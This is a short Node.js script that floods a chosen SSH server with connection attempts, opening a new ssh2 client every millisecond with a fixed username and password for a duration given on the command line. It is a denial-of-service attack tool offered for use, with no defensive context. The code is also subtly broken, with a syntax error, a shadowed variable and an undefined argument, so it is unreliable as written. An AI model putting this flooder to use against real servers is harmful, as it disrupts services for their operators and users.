const { Client } = require('ssh2');

const floodSSHServer = (hostname, port, username, duration) => {
    const startTime = Date.now();
    const interval = setInterval(() => {
        if (Date.now() - startTime > duration) {
            clearInterval(interval);
            return;
        }

        for (let i = 0; i < 1; i++) {
            const username = 'MoonXRst',
            const password = '123'
            const conn = new Client();

            conn.on('error', (err) => {
                conn.end();

            }).connect({
                host: hostname,
                port: port,
                username: username,
                password: password

            });

        }

    }, 1);
}
const host = process.argv[2];
const duration = process.argv[3] * 1000;
const port = process.argv[4];

console.log(`${duration}`)
floodSSHServer(host, port, user, duration)
